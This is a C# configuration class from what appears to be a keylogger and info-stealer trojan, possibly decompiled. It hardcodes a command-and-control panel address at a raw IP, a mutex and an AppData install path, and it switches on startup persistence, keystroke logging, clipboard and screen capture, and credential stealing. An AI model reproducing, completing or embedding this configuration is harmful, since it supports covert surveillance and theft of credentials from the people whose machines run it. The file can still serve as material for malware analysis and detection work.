using System;

internal class Settings
{
	public static string ID = ComputerInfo.UniqueID();

	public static string Password = "password";

	public static string Encryption = "encryption";

	public static string Version = "1.0.0.0";

	public static string Path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";

	public static string URL = "http://46.151.52.48/Panel/";

	public static string Mutex = "a392ad5d-8b04-4ad6-a48f-aefb72eddec1";

	public static int Interval = 2;

	public static int Quality = 65;

	public static bool Startup = true;

	public static bool Persistance = true;

	public static bool Keyboard = true;

	public static bool Clipboard = true;

	public static bool Screen = true;

	public static bool Stealer = true;
}
